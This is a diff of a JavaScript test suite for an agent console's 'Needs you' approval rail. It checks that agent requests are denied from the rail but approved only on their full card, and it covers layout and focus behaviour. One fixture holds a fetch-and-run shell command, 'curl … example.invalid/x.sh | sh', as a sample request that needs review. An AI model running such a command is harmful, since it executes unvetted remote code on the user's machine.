@@ -60,12 +60,9 @@ const NY = require('../frontend/app/needsyou.js');
   global.App.railAgentLine = ctx.line;
   A.ok(/\n    railAgentLine,/.test(appSrc), 'App exposes railAgentLine: NEEDS YOU reads the SESSIONS row\'s own line');
 }
-// what the rail READ of a row's ask line (needsyou.js measure, run for real on a stand-in row): a clamped .ny-what that holds
-// all of its text, or one that cuts it. Approve once is offered only for a line read whole (test/needs-you-rail-fit.test.js
-// reads it at every TEXT SIZE and rail width); a line never read offers Review
-const WHOLE = { clientHeight: 41, scrollHeight: 41, clientWidth: 150, scrollWidth: 150 }, CUT = { clientHeight: 41, scrollHeight: 61, clientWidth: 150, scrollWidth: 150 };
-const readAs = (i, box) => { NY._internals.measure({ querySelectorAll: () => [{ dataset: { nyKey: i.key }, querySelector: sel => sel === '.ny-what' ? box : null }] }, [i]); return i; };
-const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
+// (Andrew 10-19, THE INBOX) nothing is approved, answered or confirmed from the rail, so it reads no ask line: every row is
+// the door to where its wait is answered, and its only keys are the safe one-tap actions (Deny, Retry, Dismiss)
+const WHOLE = { clientHeight: 19, scrollHeight: 19, clientWidth: 150, scrollWidth: 150 };
 
 {
   const list = NY.items(NOW);
@@ -79,8 +76,10 @@ const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
   const grp = list.find(i => i.key === 'group:grp');
   A.eq([grp.who, grp.aid].join(' | '), 'NOVA, VEX +1 | agent', 'a group chat that waits on you is named by its members ("NOVA, VEX +1": the SESSIONS row\'s line, lead first), never GROUP');
   const grpHtml = NY._internals.html([grp], NOW);
-  A.ok(/<span class="ny-who"[^>]*><span class="ws-agent-names">NOVA, VEX<\/span><span class="ws-agent-more">\+1<\/span><\/span>/.test(grpHtml) && /class="ny-face"[^>]*data-ny-aid="agent"/.test(grpHtml) && !/>GROUP</.test(grpHtml),
-    '…drawn as that very line, with the lead\'s portrait in its well: ' + grpHtml.slice(0, 300));
+  A.ok(/<span class="ny-who"[^>]*><span class="ws-agent-names">NOVA, VEX<\/span><span class="ws-agent-more">\+1<\/span><\/span>/.test(grpHtml) && !/>GROUP</.test(grpHtml),
+    '…drawn as that very line: ' + grpHtml.slice(0, 300));
+  A.ok(/<span class="ny-face" aria-hidden="true" data-ny-aid="agent">/.test(grpHtml) && !/ny-strip/.test(grpHtml) && /<div class="ny-sec approvals" role="group" aria-label="Approval">/.test(grpHtml),
+    '…its portrait the lead\'s, under the APPROVAL strip (a group sits with what it waits on), and no strip of its own');
   A.eq(NY.lineOf(grp), 'has an approval waiting', '(its line stays what the group waits on)');
   A.ok(!list.some(i => i.key === 'ask:p9'), 'an ask in a conversation this page does not hold is not listed');
   A.ok(!list.some(i => /wr2|wr5/.test(i.key)), 'finished work and work the Commander stopped never need you');
@@ -89,15 +88,19 @@ const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
   A.eq(list.find(i => i.key === 'worker:wr1').what, 'failed: ran out of time', 'a failed worker says why in words, never the ledger\'s code');
   A.ok(!list.some(i => i.key === 'routine:cron-r2'), 'a routine that ran fine is not a to-do');
   const k = NY._internals.keysFor;
-  A.ok(/data-ny-act="once"[^>]*>Approve/.test(k(shown(ask))) && /data-ny-act="deny"[^>]*>Deny/.test(k(ask)), 'an approval: Approve / Deny right there');
+  A.ok(/data-ny-act="deny"[^>]*>Deny/.test(k(ask)) && !/data-ny-act="(once|open)"/.test(k(ask)) && !/>(Approve|Review|Answer)/.test(k(ask)),
+    'an approval: Deny, the one safe tap (approving happens on its card, which the row opens)');
   A.ok(!/data-ny-act="(always|full|session)"/.test(k(ask)), 'never a standing or lead-wide grant from the list');
-  A.ok(/data-ny-act="open"[^>]*>Answer/.test(k(list.find(i => i.key === 'ask:p1'))), 'a question: Answer opens it');
+  A.eq(k(list.find(i => i.key === 'ask:p1')), '', 'a question: no key (the row opens its card, where it is answered)');
   A.ok(/data-ny-act="retry"[^>]*>Retry/.test(k(list.find(i => i.key === 'routine:cron-r1'))), 'a failed routine: Retry');
   A.ok(/data-ny-act="dismiss"/.test(k(list.find(i => i.key === 'worker:wr1'))), 'failed delegated work: Open or Dismiss');
   const h = NY._internals.html(list, NOW);
   A.ok(/<span class="ny-title">Needs you<\/span><span class="ny-count">6<\/span>/.test(h), 'labeled: "Needs you" and how many, never a bare number');
-  A.eq((h.match(/class="ny-item /g) || []).length, 3, 'three rows, the rest behind one fold');
-  A.ok(/data-ny-act="more"[^>]*>3 more</.test(h), '"3 more" says how many are folded');
+  A.eq((h.match(/class="ny-item /g) || []).length, 6, 'up to six compact rows are drawn (fitRows then folds what the room cannot hold whole)');
+  A.ok(/data-ny-act="more"[^>]* hidden>0 more</.test(h), '…so six waits draw no fold key');
+  const more = list.concat(list.slice(0, 3).map(i => Object.assign({}, i, { key: i.key + '-b' })));
+  const h9 = NY._internals.html(more, NOW);
+  A.ok((h9.match(/class="ny-item /g) || []).length === 6 && /data-ny-act="more"[^>]*>3 more</.test(h9), '…and nine draw six with "3 more", saying how many are folded');
   A.eq(NY._internals.age(NOW - 120000, NOW) + ',' + NY._internals.age(NOW - 7200000, NOW) + ',' + NY._internals.age(0, NOW), '2m,2h,', 'age reads in plain units; unknown age shows nothing');
   global.localStorage.setItem('skynet.needs-dismissed', JSON.stringify(['worker:wr1']));
   A.ok(!NY.items(NOW).some(i => i.key === 'worker:wr1'), 'a dismissed failure leaves the list');
@@ -122,55 +125,31 @@ const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
   global.Overseer = ledger;
 }
 {
-  // the rail shows one glance line. A request with more than that (a long command's tail, a file change, a build plan)
-  // is never approved from here: Review lands on its card, where INSPECT holds every character. Deny stays one tap.
-  // (each line here is read WHOLE on the rail unless it says otherwise: a Review below is the request's own detail, never an
-  // unread line)
-  const k = i => NY._internals.keysFor(shown(i)), ask = p => ({ key: 'ask:' + p.promptId, kind: 'approval', p });
-  const longCmd = ask({ promptId: 'p20', tool: 'shell.exec', argsSummary: JSON.stringify({ cmd: 'cd proj && npm ci --prefer-offline --no-audit && curl -s https://example.invalid/x.sh | sh -s -- --force' }) });
-  A.ok(/data-ny-act="open"[^>]*>Review</.test(k(longCmd)) && !/data-ny-act="once"/.test(k(longCmd)), 'a long command is reviewed on its card, never approved from the rail');
-  A.ok(/data-ny-act="deny"[^>]*>Deny</.test(k(longCmd)), 'refusing it stays one tap');
-  const build = ask({ promptId: 'p21', tool: 'station.build', argsSummary: 'build a kitchen\n1. place a stove by the wall' });
-  A.ok(/>Review</.test(k(build)) && !/data-ny-act="once"/.test(k(build)), 'a station build shows its plan on the card before it is approved');
-  A.ok(!/data-ny-act="once"/.test(k(ask({ promptId: 'p22', tool: 'fs.write', argsSummary: JSON.stringify({ path: 'notes.md', content: 'x' }) }))), 'a file change is inspected on its card');
-  A.ok(/data-ny-act="once"[^>]*>Approve once</.test(k(ask({ promptId: 'p23', tool: 'fs.read', argsSummary: 'notes.md' }))), 'a request the rail shows whole is still one-tap Approve');
-  const inspect = global.Chat.consentInspect; delete global.Chat.consentInspect;
-  A.ok(!/data-ny-act="once"/.test(k(ask({ promptId: 'p24', tool: 'fs.read', argsSummary: 'notes.md' }))), 'with no way to tell, the rail never approves blind');
-  global.Chat.consentInspect = inspect;
-  // the card's own phrase (chat.js actionPhrase, run for real): the rail clamps it to two short lines, so a station ask
-  // (the sidecar's sentence: the job, what the line's runs spend, SEND TO downstream, that it runs unattended) and any
-  // phrase longer than those two lines go to the card, even when the card has no INSPECT panel for them
-  const phrase = global.Chat.consentPhrase; global.Chat.consentPhrase = consentCard.actionPhrase;
-  const testLine = ask({ promptId: 'p25', tool: 'station.test_line', argsSummary: 'the line Inbox triage, with this test job: "sort the 40 newest emails into folders and draft a reply to every customer". It runs the line\'s agents and spends what they spend; the result lands in DELIVERABLES › TO REVIEW. If its OUTBOX has SEND TO, the downstream line also runs the result at its own cost.' });
-  A.ok(/>Review</.test(k(testLine)) && !/data-ny-act="once"/.test(k(testLine)), 'a line test that spends money is reviewed on its card, never approved from the rail');
-  const startLine = ask({ promptId: 'p26', tool: 'station.start_line', argsSummary: 'the line Inbox triage: run it every day at 9:00, with the job: "sort the inbox". From then on it runs the line\'s agents unattended, within the line\'s budget.' });
-  A.ok(!/data-ny-act="once"/.test(k(startLine)), 'a line that will run unattended is reviewed on its card');
-  A.ok(!/data-ny-act="once"/.test(k(ask({ promptId: 'p27', tool: 'station.control', argsSummary: 'turn the room light up' }))), 'every station ask is reviewed on its card');
-  const longPath = ask({ promptId: 'p28', tool: 'fs.read', argsSummary: 'C:\\Users\\andro\\projects\\launch-prep\\drafts\\pricing\\tier-comparison-final.md' });
-  A.eq(global.Chat.consentInspect(longPath.p), null, '(a bare path under the glance limit has no INSPECT panel on its card)');
-  const cutKeys = NY._internals.keysFor(cut(longPath));
-  A.ok(/>Review</.test(cutKeys) && !/data-ny-act="once"/.test(cutKeys), 'a path longer than the rail shows (its line read cut) is reviewed on its card');
-  const unread = ask({ promptId: 'p32', tool: 'fs.read', argsSummary: 'notes.md' });
-  NY._internals.measure({ querySelectorAll: () => [] }, []);
-  A.ok(/>Review</.test(NY._internals.keysFor(unread)) && !/data-ny-act="once"/.test(NY._internals.keysFor(unread)), 'a line the rail has not read whole (not drawn yet, hidden) is reviewed, never approved blind');
-  A.ok(/data-ny-act="once"[^>]*>Approve once</.test(k(ask({ promptId: 'p29', tool: 'fs.read', argsSummary: 'notes.md' }))), 'a short request is still one-tap Approve');
-  // org P02 (g3 D1, final round): a direct-chat ask is reviewed through its own row — the row, its "in <where>" door and its
-  // ask line open the COMMS card (the whole request, its Always / Full access keys) — so its keys are Approve once · Deny on ONE
-  // row (three keys stacked into three full-width keys on the rail); a worker's ask reviews on its Delegated row's INSPECT
-  const direct = k(ask({ promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md' }));
-  A.eq((direct.match(/data-ny-act="[a-z]+"[^>]*>[^<]+</g) || []).map(x => x.replace(/^data-ny-act="([a-z]+)"[^>]*>([^<]+)<$/, '$1:$2')).join(' | '), 'once:Approve once | deny:Deny', 'a direct-chat row\'s keys: Approve once · Deny');
-  const rowHtml = NY._internals.html([shown(Object.assign(ask({ promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md' }), { who: 'NOVA', where: 'General', what: 'fs read: notes.md', since: Date.now() }))], Date.now());
-  A.ok(/<li class="ny-item approval ny-review" data-ny-key="ask:p30"[^>]*>/.test(rowHtml), 'its row is the Review door (the row click opens its card)');
-  A.ok(/<button type="button" class="ny-where" data-ny-act="open" data-ny-key="ask:p30"[^>]* data-tip="Review it on its card: the whole request, and its Always and Full access keys">in General<\/button>/.test(rowHtml), '…and its "in <where>" door says so: ' + rowHtml.slice(0, 400));
-  for (const w of [{ workerStreamId: 'thread_vex' }, { workerRunId: 'wr9' }, { background: true }]) {
-    const wa = Object.assign(ask(Object.assign({ promptId: 'p31', tool: 'fs.read', argsSummary: 'notes.md' }, w)), { who: 'VEX', where: 'General', what: 'fs read: notes.md', since: Date.now() }), wk = k(wa);
-    A.ok(/>Approve once</.test(wk) && />Deny</.test(wk) && !/>Review</.test(wk), 'a worker ask keeps Approve once · Deny (its review is the Delegated INSPECT): ' + Object.keys(w)[0]);
-    A.ok(!/ny-review/.test(NY._internals.html([shown(wa)], Date.now())), '…and its row is not offered as the Review door: ' + Object.keys(w)[0]);
-  }
+  // (Andrew 10-19, THE INBOX) no approval is approved from the rail, whatever it asks and however short its line: Deny is its
+  // one key, and the row (its "in <where>" door, its line) opens the card that shows the whole request with every key
+  const k = i => NY._internals.keysFor(i), ask = p => ({ key: 'ask:' + p.promptId, kind: 'approval', p });
+  const asks = [
+    ask({ promptId: 'p20', tool: 'shell.exec', argsSummary: JSON.stringify({ cmd: 'cd proj && npm ci --prefer-offline --no-audit && curl -s https://example.invalid/x.sh | sh -s -- --force' }) }),
+    ask({ promptId: 'p21', tool: 'station.build', argsSummary: 'build a kitchen\n1. place a stove by the wall' }),
+    ask({ promptId: 'p22', tool: 'fs.write', argsSummary: JSON.stringify({ path: 'notes.md', content: 'x' }) }),
+    ask({ promptId: 'p23', tool: 'fs.read', argsSummary: 'notes.md' }),
+    ask({ promptId: 'p27', tool: 'station.control', argsSummary: 'turn the room light up' }),
+    ask({ promptId: 'p31', tool: 'fs.read', argsSummary: 'notes.md', workerStreamId: 'thread_vex' }),
+    ask({ promptId: 'p34', tool: 'fs.read', argsSummary: 'notes.md', background: true })
+  ];
+  const keysOfAll = asks.map(a => (k(a).match(/data-ny-act="[a-z-]+"[^>]*>[^<]+</g) || []).map(x => x.replace(/^data-ny-act="([a-z-]+)"[^>]*>([^<]+)<$/, '$1:$2')).join(' | '));
+  A.eq([...new Set(keysOfAll)], ['deny:Deny'], 'every approval — a long command, a station build, a file change, a short read, a station ask, a worker\'s ask — has Deny alone, never Approve once, Review or Answer');
+  A.eq(k({ key: 'attest:q1', kind: 'attest', questId: 'q1' }), '', 'a quest an agent says is done: no key (its verdict is given on the QUESTS card, which the row opens)');
+  A.ok(!/>(Approve once|Review|Answer|Confirm|Not yet)</.test(NY._internals.html(asks.map(a => Object.assign(a, { who: 'NOVA', where: 'General', what: 'use fs read: notes.md', since: NOW - 60000 })), NOW)),
+    'no row in the list carries an Approve once, Review, Answer, Confirm or Not yet key');
   const glassCss = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'css', 'pipglass.css'), 'utf8');
-  A.ok(/\.ny-keys \{ display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; \}/.test(glassCss) && /\.ny-key \{\s*flex: 1 1 auto; min-width: 0; min-height: 34px; padding: 5px 8px; font: 15px\/1\.1 'VT323'/.test(glassCss) && !/\.ny-key\.ny-review \{ flex: 1 1 100%; \}/.test(glassCss)
-    && /\.ny-keys > \.ny-key \{ flex: 1 1 0; min-width: max-content; min-height: 34px; \}/.test(glassCss),
-    'a row has two keys, never three: they share its text column where both labels fit (the 232px rail at STANDARD) and stack, whole and 34px tall, where they do not (the 200px rail; test/needs-you-rail-fit.test.js lays both out)');
+  // the one key: a terminal key in the row's right-hand column, across its two lines, every key the column's one width
+  A.ok(/\.ny-keys \{ display: flex; flex-wrap: wrap; justify-content: flex-end; gap: 6px; margin: 0; \}/.test(glassCss)
+    && /\.ny-item > :is\(\.ny-keys, \.ny-go\) \{ grid-column: 3; grid-row: 1 \/ span 2; justify-self: end; \}/.test(glassCss)
+    && /\.ny-key \{\s*flex: 0 0 auto; min-width: 0; min-height: 34px; padding: 5px 7px; font: 16px\/1\.1 'VT323'/.test(glassCss)
+    && /\.ny-keys > \.ny-key \{ flex: 0 0 auto; min-width: 68px; min-height: 34px; text-align: center; \}/.test(glassCss),
+    'a row\'s one key stands in its right-hand column across its two lines, every key the column\'s width and 34px tall (test/needs-you-rail-fit.test.js lays it out)');
+  A.ok(/@container \(max-width: \d+px\) \{[^@]*\.ny-item > \.ny-keys \{ grid-column: 1; grid-row: 3;/.test(glassCss), 'on the narrowest panel the key steps under the lines, so the ask keeps the row\'s width');
   // (two reviews 10-16) "in <where>" was display:none on every default rail (a 250px container query): approval rows never
   // said which conversation asks, keyboard focus fell to the page while an answer was on its way (the focus assertions below
   // run on a host with no CSS, so they never saw it), and build / STEP-IN / extension / loop / group rows had nothing to focus
@@ -180,12 +159,50 @@ const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
   // live 10-16: put back into the line on keyboard focus it was a 0-22px stub on the 200px rail, so the focus showed nowhere
   A.ok(/\.ny-item:has\(> \.ny-line > \.ny-where:focus-visible\) \{ outline: 2px solid var\(--ph-bright\); outline-offset: -2px; \}/.test(glassCss),
     'a keyboard focus on a row\'s door rings the whole row (an edge, on every rail), so it is seen where the door is out of sight');
-  const doorRow = NY._internals.html([shown(Object.assign(ask({ promptId: 'p33', tool: 'fs.read', argsSummary: 'notes.md' }), { who: 'NOVA', where: 'Launch prep', what: 'use fs read: notes.md', since: Date.now() }))], Date.now());
-  A.ok(/<button type="button" class="ny-where" data-ny-act="open" data-ny-key="ask:p33" aria-label="NOVA wants to use fs read: notes\.md — in Launch prep"/.test(doorRow), 'the door\'s name says who, what, and where it lands: ' + doorRow.slice(0, 600));
-  A.ok(/<div class="ny-what" title="use fs read: notes\.md — in Launch prep — Review it on its card/.test(doorRow), 'the line\'s hover tip says where it waits (the place the narrow rail hides from the line)');
-  A.eq((NY._internals.keysFor(cut(longPath)).match(/>Review</g) || []).length, 1, 'a cut line still shows exactly one Review, never a blind Approve');
-  A.eq((k(longCmd).match(/>Review</g) || []).length, 1, 'a hidden-detail ask read whole still shows exactly one Review, never a blind Approve');
-  global.Chat.consentPhrase = phrase;
+  const doorRow = NY._internals.html([Object.assign(ask({ promptId: 'p33', tool: 'fs.read', argsSummary: 'notes.md' }), { who: 'NOVA', where: 'Launch prep', what: 'use fs read: notes.md', since: NOW - 60000 })], NOW);
+  A.ok(/<button type="button" class="ny-where" data-ny-act="open" data-ny-key="ask:p33" aria-label="Approval: NOVA wants to use fs read: notes\.md — in Launch prep"/.test(doorRow), 'the door\'s name says what the wait is, who, what, and where it lands: ' + doorRow.slice(0, 600));
+  A.ok(/<div class="ny-what" title="use fs read: notes\.md — in Launch prep">/.test(doorRow), 'the line\'s hover tip says the whole ask and where it waits (the place the narrow rail hides from the line)');
+  A.ok(/<div class="ny-line">[\s\S]*?<span class="ny-age">1m<\/span><\/div>/.test(doorRow), 'how long it has waited ends its first line');
+}
+{
+  // (Andrew 10-19, B: "I like B when they are organized together perfectly … because its groups each agent by whether its an
+  // approval etc") ONE panel, each kind of wait under its own strip, in one order, the most blocking first
+  const mk = (key, kind, extra) => Object.assign({ key, kind, who: 'NOVA', aid: 'agent', what: 'x', where: 'General', since: NOW - 60000 }, extra);
+  const mixed = [
+    mk('worker:f1', 'failed', { what: 'failed: ran out of time', since: NOW - 1000 }),
+    mk('ask:q', 'question', { what: 'Which tier?', p: { promptId: 'q' } }),
+    mk('stepin:h', 'stepin', { what: 'needs you to sign in', where: 'STEP-IN' }),
+    mk('ask:a1', 'approval', { what: 'use fs read: a.md', p: { promptId: 'a1' } }),
+    mk('ask:a2', 'approval', { what: 'use fs read: b.md', p: { promptId: 'a2' } }),
+    mk('worker:f2', 'failed', { what: 'stopped when the station restarted', since: NOW - 2000 })
+  ];
+  const hm = NY._internals.html(mixed, NOW);
+  const secs = [...hm.matchAll(/<div class="ny-sec ([a-z]+)" role="group" aria-label="[^"]*"><div class="ny-grp" aria-hidden="true"><span class="ny-grp-t">([^<]*)<\/span>(?:<span class="ny-grp-n">(\d+)<\/span>)?<\/div><ul class="ny-list">([\s\S]*?)<\/ul><\/div>/g)]
+    .map(m => [m[1], m[2], m[3] || '', [...m[4].matchAll(/data-ny-key="([^"]+)" data-ny-n/g)].map(k => k[1]).join(' ')]);
+  A.eq(secs, [
+    ['approvals', 'Approvals', '2', 'ask:a1 ask:a2'],
+    ['questions', 'Question', '', 'ask:q'],
+    ['stepin', 'Step-in', '', 'stepin:h'],
+    ['failed', 'Failed or stopped', '2', 'worker:f1 worker:f2']
+  ], 'one panel by kind, the most blocking first: each strip names its kind and counts from two waits up, and a kind keeps the list\'s own order');
+  A.eq((hm.match(/<div class="ny-panel">/g) || []).length, 1, '…in ONE panel');
+  A.ok(/<div class="ny-sec approvals" role="group" aria-label="Approvals, 2"><div class="ny-grp" aria-hidden="true">/.test(hm), 'a screen reader hears each kind once, as its group\'s label (the strip is for sight)');
+  A.eq(NY._internals.byKind([mixed[0]]).map(g => g.label).join(), 'Failed', 'failed work alone says Failed');
+  A.eq(NY._internals.byKind([mixed[5]]).map(g => g.label).join(), 'Stopped', 'work a restart or the liveness check stopped says Stopped, never Failed');
+  A.eq(NY._internals.byKind([mk('routine:r', 'routine', { what: 'routine "x" failed' })]).map(g => g.label).join(), 'Failed', 'a failed routine run says Failed');
+  A.eq(['approval', 'question', 'asked', 'stepin', 'build', 'attest', 'loop', 'extension', 'failed', 'routine'].map(kind => NY._internals.familyOf({ kind })).join(' '),
+    'approvals questions questions stepin builds quests loops extensions failed failed', 'every kind of wait has its family');
+  A.eq([NY._internals.familyOf({ kind: 'group', what: 'has an approval waiting' }), NY._internals.familyOf({ kind: 'group', what: 'has a question waiting' })].join(' '), 'approvals questions', 'a group chat sits with what it waits on');
+  // every row: its portrait (when it names an agent), and ONE right-hand column: its key, or the caret where the row only opens
+  const rowsOf = h => [...h.matchAll(/<li class="ny-item [^"]*" data-ny-key="([^"]+)"[^>]*>([\s\S]*?)<\/li>/g)];
+  A.ok(rowsOf(hm).length === 6 && rowsOf(hm).every(m => /^<span class="ny-face" aria-hidden="true" data-ny-aid="agent"><img alt="" draggable="false" hidden><\/span>/.test(m[2])),
+    'every row that names an agent leads with its portrait well (painted by AgentPortraits after the build)');
+  A.ok(rowsOf(hm).every(m => /class="ny-keys"/.test(m[2]) !== /<span class="ny-go" aria-hidden="true"><\/span>/.test(m[2])), 'every row has ONE right-hand column: its key, or else the caret (never both, never neither)');
+  const station = NY._internals.html([mk('extensions', 'extension', { who: 'STATION', aid: undefined, what: 'has 2 extensions awaiting your approval', where: 'EXTENSIONS', since: 0 })], NOW);
+  A.ok(!/ny-face/.test(station) && /<span class="ny-grp-t">Extensions<\/span><\/div>/.test(station), 'a wait that names no agent (the STATION\'s extensions) has no empty portrait well');
+  const src = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'app', 'needsyou.js'), 'utf8');
+  A.ok(/host\.innerHTML = html\(list, now\);\s*\n\s*paintFaces\(host\);/.test(src) && /AgentPortraits\.paint\(face\.querySelector\('img'\), a\)/.test(src),
+    'every rebuild paints the portraits through AgentPortraits (the CREW card\'s own figure)');
 }
 {
   const app = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'app', 'app.js'), 'utf8');
@@ -196,12 +213,14 @@ const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
   // so the lower asks' keys and "Show fewer" stay reachable, with a themed scrollbar (never a white native one)
   const glass = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'css', 'pipglass.css'), 'utf8');
   A.ok(/\n#left \.ws-needs \{[^}]*max-height: min\(48%, 440px\);[^}]*overflow-y: auto;[^}]*overscroll-behavior: contain;/.test(glass), 'NEEDS YOU has a height bound and scrolls inside its card, unscoped so every rail mode gets it');
+  A.ok(/\n#left \.ws-needs\.ny-open \{ max-height: min\(72%, 680px\); \}/.test(glass) && /host\.classList\.toggle\('ny-open', expanded\)/.test(fs.readFileSync(path.join(__dirname, '..', 'frontend', 'app', 'needsyou.js'), 'utf8')),
+    'opened ("N more"), the list takes the rail\'s room rather than a short box that slices its rows');
   A.ok(/\n#left \.ws-needs::-webkit-scrollbar-thumb \{[^}]*background: var\(--ph-dim\)/.test(glass) && /\n#left \.ws-needs \{[^}]*scrollbar-color: var\(--ph-dim\) transparent/.test(glass), 'its scrollbar is themed like COMMS');
   A.ok(/if \(railView !== 'sessions'\) \{ host\.hidden = true; return; \}\s*\n\s*if \(typeof NeedsYou !== 'undefined' && NeedsYou\.render\) NeedsYou\.render\(\);/.test(app), 'the rail renders it (SESSIONS view only)');
   A.ok(/NeedsYou\.render\(\);   \/\/ ages tick, failures arrive/.test(app), 'and the 1s rail heartbeat keeps it current');
   const ny = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'app', 'needsyou.js'), 'utf8');
-  A.ok(/Chat\.answerConsent\(i\.p, Workstreams\.get\(i\.wsId\), kind, 'needs-you'\)/.test(ny), 'Approve / Deny answer through the approval card\'s own path (and say they came from NEEDS YOU)');
-  A.ok(/fetch\('\/api\/cron\/run', \{ method: 'POST'[^\n]*detach: true/.test(ny), 'Retry reruns the routine for real (detached)');
+  A.ok(/Chat\.answerConsent\(i\.p, Workstreams\.get\(i\.wsId\), kind, 'needs-you'\)/.test(ny), 'Deny answers through the approval card\'s own path (and says it came from NEEDS YOU)');
+  A.ok(/Harness\.streamPost\('\/api\/cron\/run', \{ id: i\.routineId, detach: true \}\)/.test(ny), 'Retry reruns the routine for real (detached), on the page\'s one run stream');
 }
 /* ---- the rail's 1s heartbeat: an age tick never rebuilds the list (focus survives), an answer in flight stays locked ---- */
 // a host that understands exactly the markup html() writes (no DOM library in this repo's headless tests)
@@ -237,45 +256,43 @@ function fakeRail() {
   const write = Object.getOwnPropertyDescriptor(host, 'innerHTML').set;
   Object.defineProperty(host, 'innerHTML', { get() { return this._h; }, set(h) { drawn.push(h); write.call(this, h); }, configurable: true });
   NY.render();
-  A.eq(host.writes, 2, 'the first render draws the list, then once more when it has read each ask line whole');
-  A.ok(/data-ny-act="open" data-ny-key="ask:p2"[^>]*>Review</.test(drawn[0]) && !/data-ny-act="once"/.test(drawn[0]), '…the first draw offers Review: no line is read yet');
-  A.ok(key('once', 'ask:p2') && !host.buttons.some(x => x.dataset.nyAct === 'open' && x.dataset.nyKey === 'ask:p2' && x.className.split(' ').includes('ny-key')), '…and the redraw offers Approve once for the line read whole, before anything paints');
-  doc.activeElement = key('once', 'ask:p2');
+  A.eq(host.writes, 1, 'the first render draws the list once (it reads no line, so nothing redraws)');
+  A.ok(key('deny', 'ask:p2') && !key('once', 'ask:p2') && !host.buttons.some(x => x.dataset.nyAct === 'open' && x.dataset.nyKey === 'ask:p2' && x.className.split(' ').includes('ny-key')),
+    '…an approval drawn with Deny alone: no Approve once, no Review key');
+  doc.activeElement = key('deny', 'ask:p2');
   clock = NOW + 60000; NY.render();
-  A.eq(host.writes, 2, 'a minute passing does not rebuild the list');
+  A.eq(host.writes, 1, 'a minute passing does not rebuild the list');
   A.eq(host.rows.find(r => r.dataset.nyKey === 'ask:p2').ageEl.textContent, '3m', 'only the age text moves, in place');
-  A.ok(doc.activeElement === key('once', 'ask:p2'), 'so the key the Commander is on keeps its focus');
+  A.ok(doc.activeElement === key('deny', 'ask:p2'), 'so the key the Commander is on keeps its focus');
   pend.push({ wsId: 'proj', p: { promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md', askedAt: NOW - 30000 } });
   NY.render();
-  A.eq(host.writes, 3, 'a new ask rebuilds the list (folded under "more", it is not read yet, so nothing redraws)');
-  A.ok(doc.activeElement && doc.activeElement === key('once', 'ask:p2'), 'and focus lands back on the same key in the new list');
-  // an answer in flight: both keys stay disabled through every re-render, and a second click sends nothing
+  A.eq(host.writes, 2, 'a new ask rebuilds the list');
+  A.ok(doc.activeElement && doc.activeElement === key('deny', 'ask:p2'), 'and focus lands back on the same key in the new list');
+  // an answer in flight: the key stays disabled through every re-render, and a second click sends nothing
   let calls = 0, settle = null;
   const answerConsent = global.Chat.answerConsent;
   global.Chat.answerConsent = () => { calls++; return new Promise(r => { settle = r; }); };
   const click = b => host.listeners.click({ target: { closest: sel => sel === '[data-ny-act]' ? b : null }, preventDefault() {}, stopPropagation() {} });
-  click(key('once', 'ask:p2'));
-  A.ok(key('once', 'ask:p2').disabled && key('deny', 'ask:p2').disabled, 'Approve and Deny are disabled while the answer is in flight');
-  A.ok(doc.activeElement === key('open', 'ask:p2'), 'a keyboard answer keeps focus on that ask\'s row (its "in <where>" key), never drops it to the page');
+  click(key('deny', 'ask:p2'));
+  A.ok(key('deny', 'ask:p2').disabled, 'Deny is disabled while the answer is in flight');
+  A.ok(doc.activeElement === key('open', 'ask:p2'), 'a keyboard answer keeps focus on that ask\'s row (its "in <where>" door), never drops it to the page');
   clock += 1000; pend.push({ wsId: 'proj', p: { promptId: 'p31', tool: 'fs.read', argsSummary: 'b.md', askedAt: NOW - 20000 } }); NY.render();
-  A.ok(key('once', 'ask:p2').disabled && key('deny', 'ask:p2').disabled, 'and stay disabled when the list rebuilds meanwhile');
+  A.ok(key('deny', 'ask:p2').disabled, 'and stays disabled when the list rebuilds meanwhile');
   A.ok(doc.activeElement === key('open', 'ask:p2'), 'and focus stays on that row through the rebuild');
-  click(key('once', 'ask:p2')); click({ dataset: { nyAct: 'deny', nyKey: 'ask:p2' } });
+  click(key('deny', 'ask:p2')); click({ dataset: { nyAct: 'deny', nyKey: 'ask:p2' } });
   A.eq(calls, 1, 'a second click on a settling ask sends no second answer');
   pend.splice(pend.findIndex(x => x.p.promptId === 'p2'), 1);
   settle(); await new Promise(r => setTimeout(r, 0));
-  A.ok(!key('once', 'ask:p2') && !/ask:p2/.test(host.innerHTML), 'once answered, the ask leaves the list');
-  // an answer that fails: the keys come back, and so does the focus
+  A.ok(!key('deny', 'ask:p2') && !/ask:p2/.test(host.innerHTML), 'once answered, the ask leaves the list');
+  // an answer that fails: the key comes back, and so does the focus
   let fail = null;
   global.Chat.answerConsent = () => new Promise((_, no) => { fail = no; });
-  doc.activeElement = key('once', 'ask:p30');
-  click(key('once', 'ask:p30'));
-  // org P02 (g3 D1, final round): a direct-chat row's Review is its row's own door, so focus waits on that row's "in <where>"
-  // door (live while the keys are locked), never dropped to the page
-  const review30 = host.buttons.find(b => b.dataset.nyAct === 'open' && b.dataset.nyKey === 'ask:p30' && b.className.split(' ').includes('ny-where'));
-  A.ok(key('once', 'ask:p30').disabled && review30 && doc.activeElement === review30, 'a second ask in flight: its keys lock, focus waits on its row (its review door)');
+  doc.activeElement = key('deny', 'ask:p30');
+  click(key('deny', 'ask:p30'));
+  const door30 = host.buttons.find(b => b.dataset.nyAct === 'open' && b.dataset.nyKey === 'ask:p30' && b.className.split(' ').includes('ny-where'));
+  A.ok(key('deny', 'ask:p30').disabled && door30 && doc.activeElement === door30, 'a second ask in flight: its key locks, focus waits on its row\'s door');
   fail(new Error('the station is offline')); await new Promise(r => setTimeout(r, 0));
-  A.ok(!key('once', 'ask:p30').disabled && doc.activeElement === key('once', 'ask:p30'), 'the answer failed: Approve is back and so is the focus');
